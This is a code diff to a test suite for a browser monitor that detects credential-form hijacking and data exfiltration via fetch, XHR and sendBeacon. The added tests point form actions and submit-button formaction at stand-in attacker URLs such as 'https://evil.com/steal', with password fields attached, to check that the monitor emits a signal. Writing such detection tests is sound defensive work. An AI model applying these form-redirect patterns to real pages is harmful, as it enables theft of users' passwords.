@@ -102,6 +102,12 @@ describe("extractOrigin", () => {
     // ":::invalid" is treated as a relative path by URL constructor
     expect(extractOrigin(":::invalid")).toBe(location.origin);
   });
+
+  it("returns empty for opaque and script-like schemes", () => {
+    expect(extractOrigin("data:text/html,<form></form>")).toBe("");
+    expect(extractOrigin("javascript:void(0)")).toBe("");
+    expect(extractOrigin("blob:https://example.com/id")).toBe("");
+  });
 });
 
 describe("correlatesWithFormSubmit", () => {
@@ -211,11 +217,11 @@ describe("initJsBehaviorMonitor form submit detection", () => {
 
   it("emits signal for non-credential form with dynamically changed action", () => {
     const postSignal = vi.fn();
-    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
-
     const form = document.createElement("form");
     form.setAttribute("action", "/safe-endpoint");
     document.body.appendChild(form);
+
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
 
     // Dynamically change the action to a cross-origin URL
     form.action = "https://evil.com/exfil";
@@ -229,9 +235,64 @@ describe("initJsBehaviorMonitor form submit detection", () => {
       })
     );
   });
+
+  it("does not mark an unobserved initial cross-origin action as dynamic", () => {
+    const postSignal = vi.fn();
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    const form = document.createElement("form");
+    form.setAttribute("action", "https://payments.example/submit");
+    document.body.appendChild(form);
+
+    form.dispatchEvent(new Event("submit", { bubbles: true }));
+
+    expect(postSignal).not.toHaveBeenCalled();
+  });
+
+  it("uses submitter formaction as the effective destination", () => {
+    const postSignal = vi.fn();
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    const form = document.createElement("form");
+    form.action = "/login";
+    const pw = document.createElement("input");
+    pw.type = "password";
+    const button = document.createElement("button");
+    button.type = "submit";
+    button.setAttribute("formaction", "https://evil.com/steal");
+    form.append(pw, button);
+    document.body.appendChild(form);
+
+    form.dispatchEvent(new SubmitEvent("submit", { bubbles: true, submitter: button }));
+
+    expect(postSignal).toHaveBeenCalledWith(
+      "ns-js-form-submit-suspicious",
+      expect.objectContaining({
+        isCrossOrigin: true,
+        destinationOrigin: "https://evil.com",
+      })
+    );
+  });
+
+  it("does not stack submit listeners when initialized twice", () => {
+    const postSignal = vi.fn();
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    const form = document.createElement("form");
+    form.action = "https://evil.com/steal";
+    const pw = document.createElement("input");
+    pw.type = "password";
+    form.appendChild(pw);
+    document.body.appendChild(form);
+
+    form.dispatchEvent(new Event("submit", { bubbles: true }));
+
+    expect(postSignal).toHaveBeenCalledTimes(1);
+  });
 });
 
-describe("isCrossOriginUrl – data/javascript/blob URIs", () => {
+describe("isCrossOriginUrl data/javascript/blob URIs", () => {
   it("returns false for data: URIs", () => {
     expect(isCrossOriginUrl("data:text/html,<h1>hi</h1>")).toBe(false);
   });
@@ -249,7 +310,7 @@ describe("isCrossOriginUrl – data/javascript/blob URIs", () => {
   });
 });
 
-describe("correlatesWithFormSubmit – bounds checking", () => {
+describe("correlatesWithFormSubmit bounds checking", () => {
   it("returns false when request timestamp is before the submit", () => {
     const postSignal = vi.fn();
     initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
@@ -263,7 +324,7 @@ describe("correlatesWithFormSubmit – bounds checking", () => {
 
     form.dispatchEvent(new Event("submit", { bubbles: true }));
 
-    // Request timestamp earlier than the submit — negative delta
+    // Request timestamp earlier than the submit: negative delta.
     expect(correlatesWithFormSubmit(0)).toBe(false);
   });
 });
@@ -282,7 +343,7 @@ describe("credential field value monitoring", () => {
     // Set value directly on the element
     input.value = "secret123";
 
-    // Read it back — this should trigger the credential read signal
+    // Read it back; this should trigger the credential read signal.
     const _val = input.value;
     void _val;
 
@@ -292,6 +353,24 @@ describe("credential field value monitoring", () => {
         isInsideSubmitHandler: false,
         fieldCount: 1,
       })
+    );
+  });
+
+  it("returns password values even when signal emission throws", () => {
+    const postSignal = vi.fn(() => {
+      throw new Error("bridge unavailable");
+    });
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    const input = document.createElement("input");
+    input.type = "password";
+    input.value = "secret123";
+    document.body.appendChild(input);
+
+    expect(input.value).toBe("secret123");
+    expect(postSignal).toHaveBeenCalledWith(
+      "ns-js-credential-read",
+      expect.anything()
     );
   });
 
@@ -415,7 +494,7 @@ describe("credential field value monitoring", () => {
   });
 });
 
-describe("network exfiltration monitoring – fetch", () => {
+describe("network exfiltration monitoring fetch", () => {
   it("emits exfil signal when fetch to 3P correlates with credential form submit", () => {
     const postSignal = vi.fn();
     initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
@@ -474,7 +553,7 @@ describe("network exfiltration monitoring – fetch", () => {
   });
 });
 
-describe("network exfiltration monitoring – XHR", () => {
+describe("network exfiltration monitoring XHR", () => {
   it("emits exfil signal when XHR to 3P correlates with credential form submit", () => {
     const postSignal = vi.fn();
     initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
@@ -502,7 +581,7 @@ describe("network exfiltration monitoring – XHR", () => {
   });
 });
 
-describe("network exfiltration monitoring – beacon", () => {
+describe("network exfiltration monitoring beacon", () => {
   it("emits beacon signal when sendBeacon to 3P on credential page", () => {
     const postSignal = vi.fn();
     initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
